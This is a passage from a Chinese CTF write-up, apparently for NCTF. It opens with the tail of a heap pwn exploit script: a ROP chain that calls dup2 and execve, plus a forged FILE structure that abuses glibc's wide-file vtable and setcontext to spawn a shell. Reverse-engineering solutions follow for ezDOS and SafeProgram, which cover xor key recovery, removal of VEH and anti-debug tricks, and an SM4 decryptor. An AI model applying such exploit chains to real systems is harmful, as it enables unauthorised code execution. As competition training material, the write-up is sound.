punctuation\">)</span><span class=\"token operator\">+</span>p64<span class=\"token punctuation\">(</span>target1<span class=\"token punctuation\">)</span>\n\nfake_io_addr<span class=\"token operator\">=</span>heap<span class=\"token operator\">+</span><span class=\"token number\">0xd20</span>\n\nedit<span class=\"token punctuation\">(</span><span class=\"token number\">7</span><span class=\"token punctuation\">,</span> p<span class=\"token punctuation\">)</span>\nadd<span class=\"token punctuation\">(</span><span class=\"token number\">0x101</span><span class=\"token punctuation\">,</span> p64<span class=\"token punctuation\">(</span>fake_io_addr<span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span>\n\nsystem<span class=\"token operator\">=</span>libc<span class=\"token operator\">+</span><span class=\"token number\">0x58750</span>\nenviron<span class=\"token operator\">=</span>libc<span class=\"token operator\">+</span><span class=\"token number\">0x20ad58</span>\n_IO_wfile_jumps<span class=\"token operator\">=</span>libc<span class=\"token operator\">+</span><span class=\"token number\">0x202228</span>\nsetcontext<span class=\"token operator\">=</span>libc<span class=\"token operator\">+</span><span class=\"token number\">0x4a99d</span>\n\nrop_addr<span class=\"token operator\">=</span>heap<span class=\"token operator\">+</span><span class=\"token number\">0x850</span>\nrax<span class=\"token operator\">=</span>libc<span class=\"token operator\">+</span><span class=\"token number\">0xdd237</span>\nrdi<span class=\"token operator\">=</span>libc<span class=\"token operator\">+</span><span class=\"token number\">0x158748</span>\nrsi<span class=\"token operator\">=</span>libc<span class=\"token operator\">+</span><span class=\"token number\">0x02b46b</span>\nsyscall<span class=\"token operator\">=</span>libc<span class=\"token operator\">+</span><span class=\"token number\">0x127185</span><span class=\"token operator\">+</span><span class=\"token number\">4</span>\nrsp<span class=\"token operator\">=</span>libc<span class=\"token operator\">+</span><span class=\"token number\">0x5ef6f</span>\nrdx<span class=\"token operator\">=</span>libc<span class=\"token operator\">+</span><span class=\"token number\">0x162e3a</span>\n\nrop<span class=\"token operator\">=</span>p64<span class=\"token punctuation\">(</span>rax<span class=\"token punctuation\">)</span><span class=\"token operator\">+</span>p64<span class=\"token punctuation\">(</span><span class=\"token number\">0x21</span><span class=\"token punctuation\">)</span>\nrop<span class=\"token operator\">+=</span>p64<span class=\"token punctuation\">(</span>rdi<span class=\"token punctuation\">)</span><span class=\"token operator\">+</span>p64<span class=\"token punctuation\">(</span><span class=\"token number\">4</span><span class=\"token punctuation\">)</span><span class=\"token operator\">+</span>p64<span class=\"token punctuation\">(</span><span class=\"token number\">0</span><span class=\"token punctuation\">)</span><span class=\"token operator\">*</span><span class=\"token number\">5</span>\nrop<span class=\"token operator\">+=</span>p64<span class=\"token punctuation\">(</span>rsi<span class=\"token punctuation\">)</span><span class=\"token operator\">+</span>p64<span class=\"token punctuation\">(</span><span class=\"token number\">0</span><span class=\"token punctuation\">)</span><span class=\"token operator\">*</span><span class=\"token number\">2</span>\nrop<span class=\"token operator\">+=</span>p64<span class=\"token punctuation\">(</span>syscall<span class=\"token punctuation\">)</span>\n\nrop<span class=\"token operator\">+=</span>p64<span class=\"token punctuation\">(</span>rax<span class=\"token punctuation\">)</span><span class=\"token operator\">+</span>p64<span class=\"token punctuation\">(</span><span class=\"token number\">0x21</span><span class=\"token punctuation\">)</span>\nrop<span class=\"token operator\">+=</span>p64<span class=\"token punctuation\">(</span>rdi<span class=\"token punctuation\">)</span><span class=\"token operator\">+</span>p64<span class=\"token punctuation\">(</span><span class=\"token number\">4</span><span class=\"token punctuation\">)</span><span class=\"token operator\">+</span>p64<span class=\"token punctuation\">(</span><span class=\"token number\">0</span><span class=\"token punctuation\">)</span><span class=\"token operator\">*</span><span class=\"token number\">5</span>\nrop<span class=\"token operator\">+=</span>p64<span class=\"token punctuation\">(</span>rsi<span class=\"token punctuation\">)</span><span class=\"token operator\">+</span>p64<span class=\"token punctuation\">(</span><span class=\"token number\">1</span><span class=\"token punctuation\">)</span><span class=\"token operator\">*</span><span class=\"token number\">2</span>\nrop<span class=\"token operator\">+=</span>p64<span class=\"token punctuation\">(</span>syscall<span class=\"token punctuation\">)</span>\n\nrop<span class=\"token operator\">+=</span>p64<span class=\"token punctuation\">(</span>rax<span class=\"token punctuation\">)</span><span class=\"token operator\">+</span>p64<span class=\"token punctuation\">(</span><span class=\"token number\">0x3b</span><span class=\"token punctuation\">)</span>\nrop<span class=\"token operator\">+=</span>p64<span class=\"token punctuation\">(</span>rdi<span class=\"token punctuation\">)</span><span class=\"token operator\">+</span>p64<span class=\"token punctuation\">(</span>heap<span class=\"token operator\">+</span><span class=\"token number\">0xd20</span><span class=\"token punctuation\">)</span><span class=\"token operator\">+</span>p64<span class=\"token punctuation\">(</span><span class=\"token number\">0</span><span class=\"token punctuation\">)</span><span class=\"token operator\">*</span><span class=\"token number\">5</span>\nrop<span class=\"token operator\">+=</span>p64<span class=\"token punctuation\">(</span>rsi<span class=\"token punctuation\">)</span><span class=\"token operator\">+</span>p64<span class=\"token punctuation\">(</span><span class=\"token number\">0</span><span class=\"token punctuation\">)</span><span class=\"token operator\">+</span>p64<span class=\"token punctuation\">(</span>heap<span class=\"token operator\">+</span><span class=\"token number\">0x978</span><span class=\"token operator\">+</span><span class=\"token number\">0x28</span><span class=\"token punctuation\">)</span>\nrop<span class=\"token operator\">+=</span>p64<span class=\"token punctuation\">(</span>rdx<span class=\"token punctuation\">)</span><span class=\"token operator\">+</span>p64<span class=\"token punctuation\">(</span><span class=\"token number\">0</span><span class=\"token punctuation\">)</span><span class=\"token operator\">*</span><span class=\"token number\">3</span><span class=\"token operator\">+</span>p64<span class=\"token punctuation\">(</span>heap<span class=\"token operator\">+</span><span class=\"token number\">0x978</span><span class=\"token operator\">+</span><span class=\"token number\">0x28</span><span class=\"token punctuation\">)</span>\nrop<span class=\"token operator\">+=</span>p64<span class=\"token punctuation\">(</span>syscall<span class=\"token punctuation\">)</span>\n\nedit<span class=\"token punctuation\">(</span><span class=\"token number\">5</span><span class=\"token punctuation\">,</span> rop<span class=\"token punctuation\">)</span>\n\nfake_io <span class=\"token operator\">=</span> flat<span class=\"token punctuation\">(</span><span class=\"token punctuation\">&#123;</span>\n    <span class=\"token number\">0x0</span><span class=\"token punctuation\">:</span> <span class=\"token string\">\" sh;\"</span><span class=\"token punctuation\">,</span>\n    <span class=\"token number\">0x10</span><span class=\"token punctuation\">:</span> p64<span class=\"token punctuation\">(</span>setcontext<span class=\"token punctuation\">)</span><span class=\"token punctuation\">,</span>\n    <span class=\"token number\">0x20</span><span class=\"token punctuation\">:</span> p64<span class=\"token punctuation\">(</span>stdout<span class=\"token punctuation\">)</span><span class=\"token punctuation\">,</span>\n    <span class=\"token number\">0x88</span><span class=\"token punctuation\">:</span> p64<span class=\"token punctuation\">(</span>rop_addr<span class=\"token punctuation\">)</span><span class=\"token punctuation\">,</span>  <span class=\"token comment\"># _lock</span>\n    <span class=\"token number\">0xa0</span><span class=\"token punctuation\">:</span> p64<span class=\"token punctuation\">(</span>stdout<span class=\"token punctuation\">)</span><span class=\"token punctuation\">,</span>\n    <span class=\"token number\">0xa8</span><span class=\"token punctuation\">:</span> p64<span class=\"token punctuation\">(</span>rsp<span class=\"token punctuation\">)</span><span class=\"token punctuation\">,</span>\n    <span class=\"token number\">0xd8</span><span class=\"token punctuation\">:</span> p64<span class=\"token punctuation\">(</span>_IO_wfile_jumps <span class=\"token operator\">+</span> <span class=\"token number\">0x10</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">,</span>\n    <span class=\"token number\">0xe0</span><span class=\"token punctuation\">:</span> p64<span class=\"token punctuation\">(</span>stdout<span class=\"token operator\">-</span><span class=\"token number\">8</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">,</span>\n<span class=\"token punctuation\">&#125;</span><span class=\"token punctuation\">,</span> filler<span class=\"token operator\">=</span><span class=\"token string\">b\"\\x00\"</span><span class=\"token punctuation\">)</span>\n\n\nadd<span class=\"token punctuation\">(</span><span class=\"token number\">0x101</span><span class=\"token punctuation\">,</span> fake_io<span class=\"token punctuation\">)</span>\nshell<span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span></code></pre>\n\n\n\n<h2 id=\"RE\"><a href=\"#RE\" class=\"headerlink\" title=\"RE\"></a>RE</h2><h3 id=\"ezDOS\"><a href=\"#ezDOS\" class=\"headerlink\" title=\"ezDOS\"></a>ezDOS</h3><p>程序中间出现的花指令都直接nop去除，然后Apply patch到程序。</p>\n<p><img src=\"/images/1742731823755-b823cf34-aab4-4fbe-bf7e-f53a4aaa3497.png\"></p>\n<p>程序要求输入38长度字符串，然后进行一系列变种类RC4算法加密，然后与0x141地址的38字节数据进行比对。</p>\n<p><img src=\"/images/1742732096513-faa2f920-70f8-4a36-93df-91f224f7c6d0.png\"></p>\n<p>使用dosbox动调，在FA代码处是对取出的al对输入的字符串进行xor加密。0x32是取出的异或值，0x31是输入的字符’1’。</p>\n<p><img src=\"/images/1742732287881-3999c9b7-5e31-4121-9f55-e2b906e10ccd.png\"></p>\n<p><img src=\"/images/1742732249120-5fda8d14-cb9b-4f49-8bf6-614e6960dc63.png\"></p>\n<p>直接debug一直循环执行这边，即可拿到对输入字符串异或的一系列异或值。</p>\n<blockquote>\n<p>32 7d 59 7a f3 0d b3 7b 64 8c eb 28 c4 a4 50 30 a0 ed 27 6a e3 76 69 0c da 28 f8 08 ba a6 17 3e 12 59 45 06 4e f1</p>\n</blockquote>\n<p>取出0x142地址的38字节，进行异或即可得到解密flag。</p>\n<p><img src=\"/images/1742732520225-ea38e755-4155-4ff4-b845-9fd37b9bcc95.png\"></p>\n<h3 id=\"SafeProgram\"><a href=\"#SafeProgram\" class=\"headerlink\" title=\"SafeProgram\"></a>SafeProgram</h3><p>核心加密是一个SM4加密。</p>\n<p><img src=\"/images/1742733064140-f984f029-5c19-40da-96a2-7c9933518e4b.png\"></p>\n<p>查看byte_14002A0D0数组交叉引用，发现在其他函数被访问过。</p>\n<p><img src=\"/images/1742733138431-04584683-08b6-44f7-a471-1549be8e206e.png\"></p>\n<p><img src=\"/images/1742733148877-755426b6-0cd4-4c98-86b0-49efafd7b7e6.png\"></p>\n<p>发现是在VEH异常Handler里面调用的，第一个AddVectoredExceptionHandler得直接nop，不然运行就直接退出。</p>\n<p><img src=\"/images/1742733208272-ce5e8263-86f4-4503-8a09-968a5e694740.png\"></p>\n<p><img src=\"/images/1742733215267-dd1e9a92-33aa-4250-a846-4191f12379b8.png\"></p>\n<p><img src=\"/images/1742733314872-bc3290b8-a385-47a3-965d-5477921a25a5.png\"></p>\n<p>然后在这个函数开头断点，使用ScyllaHide插件一键去除反调试，防止其他地方的反调试。</p>\n<p><img src=\"/images/1742733356084-873e99b1-43f0-4c23-9c16-33ce6afc2a5b.png\"></p>\n<p>main函数可以看到要求输入格式为NCTF{…}的长度38字符串，然后运行到箭头函数会触发除0异常，然后就会触发VEH那个Handler导致那个byte数组被修改，需要提取的数据是被改后的。</p>\n<p><img src=\"/images/1742733443971-e0cf12c7-c12a-48b3-b557-7ff20d700ec6.png\"></p>\n<p>动调时提取这三个数组数据，进行解密即可。</p>\n<p><img src=\"/images/1742733627618-776e5556-677d-4108-957a-8081f3a182ad.png\"></p>\n<p>key是main函数两次memcpy那边的数据，结果如下。</p>\n<p><img src=\"/images/1742733798575-ba99240d-931c-4963-aecb-87467e43e57a.png\"></p>\n<p>解密代码：</p>\n<pre class=\"language-cpp\" data-language=\"cpp\"><code class=\"language-cpp\"><span class=\"token macro property\"><span class=\"token directive-hash\">#</span><span class=\"token directive keyword\">include</span> <span class=\"token string\">&lt;iostream></span></span>\n<span class=\"token macro property\"><span class=\"token directive-hash\">#</span><span class=\"token directive keyword\">include</span> <span class=\"token string\">&lt;string></span></span>\n<span class=\"token macro property\"><span class=\"token directive-hash\">#</span><span class=\"token directive keyword\">include</span> <span class=\"token string\">&lt;windows.h></span></span>\n<span class=\"token macro property\"><span class=\"token directive-hash\">#</span><span class=\"token directive keyword\">include</span> <span class=\"token string\">&lt;vector></span></span>\n\n<span class=\"token keyword\">unsigned</span> <span class=\"token keyword\">char</span> byte_7FF699A4A0D0<span class=\"token punctuation\">[</span><span class=\"token number\">256</span><span class=\"token punctuation\">]</span> <span class=\"token operator\">=</span> <span class=\"token punctuation\">&#123;</span>\n<span class=\"token number\">0xD1</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x90</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0xE9</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0xFE</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0xCC</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0xE1</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x3D</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0xB7</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x16</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0xB6</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x14</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0xC2</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x28</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0xFB</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x2C</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x05</span><span class=\"token punctuation\">,</span>\n<span class=\"token number\">0x2B</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x67</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x9A</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x76</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x2A</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0xBE</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x04</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0xC3</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0xAA</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x44</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x13</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x26</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x49</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x86</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x06</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x99</span><span class=\"token punctuation\">,</span>\n<span class=\"token number\">0x9C</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x42</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x50</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0xF4</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x91</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0xEF</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x98</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x7A</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x33</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x54</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x0B</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x43</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0xED</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0xCF</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0xAC</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x62</span><span class=\"token punctuation\">,</span>\n<span class=\"token number\">0xE4</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0xB3</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x17</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0xA9</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x1C</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x08</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0xE8</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x95</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x80</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0xDF</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x94</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0xFA</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x75</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x8F</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x3F</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0xA6</span><span class=\"token punctuation\">,</span>\n<span class=\"token number\">0x47</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x07</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0xA7</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x4F</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0xF3</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x73</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x71</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0xBA</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x83</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x59</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x3C</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x19</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0xE6</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x85</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0xD6</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0xA8</span><span class=\"token punctuation\">,</span>\n<span class=\"token number\">0x68</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x6B</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x81</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0xB2</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0xFC</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x64</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0xDA</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x8B</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0xF8</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0xEB</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x0F</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x4B</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x70</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x56</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x9D</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x35</span><span class=\"token punctuation\">,</span>\n<span class=\"token number\">0x1E</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x24</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x0E</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x78</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x63</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x58</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x9F</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0xA2</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x25</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x22</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x7C</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x3B</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x01</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x21</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0xC9</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x87</span><span class=\"token punctuation\">,</span>\n<span class=\"token number\">0xD4</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x00</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x46</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x57</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x5E</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0xD3</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x27</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x52</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x4C</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x36</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x02</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0xE7</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0xA0</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0xC4</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0xC8</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x9E</span><span class=\"token punctuation\">,</span>\n<span class=\"token number\">0xEA</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0xBF</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x8A</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0xD2</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x40</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0xC7</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x38</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0xB5</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0xA3</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0xF7</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0xF2</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0xCE</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0xF9</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x61</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x15</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0xA1</span><span class=\"token punctuation\">,</span>\n<span class=\"token number\">0xE0</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0xAE</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x5D</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0xA4</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x9B</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x34</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x1A</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x55</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0xAD</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x93</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x32</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x30</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0xF5</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x8C</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0xB1</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0xE3</span><span class=\"token punctuation\">,</span>\n<span class=\"token number\">0x1D</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0xF6</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0xE2</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x2E</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x82</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x66</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0xCA</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x60</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0xC0</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x29</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x23</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0xAB</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x0D</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x53</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x4E</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x6F</span><span class=\"token punctuation\">,</span>\n<span class=\"token number\">0xD5</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0xDB</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x37</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x45</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0xDE</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0xFD</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x8E</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x2F</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x03</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0xFF</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x6A</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x72</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x6D</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x6C</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x5B</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x51</span><span class=\"token punctuation\">,</span>\n<span class=\"token number\">0x8D</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x1B</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0xAF</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x92</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0xBB</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0xDD</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0xBC</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x7F</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x11</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0xD9</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x5C</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x41</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x1F</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x10</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x5A</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0xD8</span><span class=\"token punctuation\">,</span>\n<span class=\"token number\">0x0A</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0xC1</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x31</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x88</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0xA5</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0xCD</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x7B</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0xBD</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x2D</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x74</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0xD0</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x12</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0xB8</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0xE5</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0xB4</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0xB0</span><span class=\"token punctuation\">,</span>\n<span class=\"token number\">0x89</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x69</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x97</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x4A</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x0C</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x96</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x77</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x7E</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x65</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0xB9</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0xF1</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x09</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0xC5</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x6E</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0xC6</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x84</span><span class=\"token punctuation\">,</span>\n<span class=\"token number\">0x18</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0xF0</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x7D</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0xEC</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x3A</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0xDC</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x4D</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x20</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x79</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0xEE</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x5F</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x3E</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0xD7</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0xCB</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x39</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x48</span>\n<span class=\"token punctuation\">&#125;</span><span class=\"token punctuation\">;</span>\n\n<span class=\"token keyword\">unsigned</span> <span class=\"token keyword\">int</span> dword_7FF699A4A040<span class=\"token punctuation\">[</span><span class=\"token number\">32</span><span class=\"token punctuation\">]</span> <span class=\"token operator\">=</span> <span class=\"token punctuation\">&#123;</span>\n<span class=\"token number\">0x00070E15</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x1C232A31</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x383F464D</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x545B6269</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x70777E85</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x8C939AA1</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0xA8AFB6BD</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0xC4CBD2D9</span><span class=\"token punctuation\">,</span>\n<span class=\"token 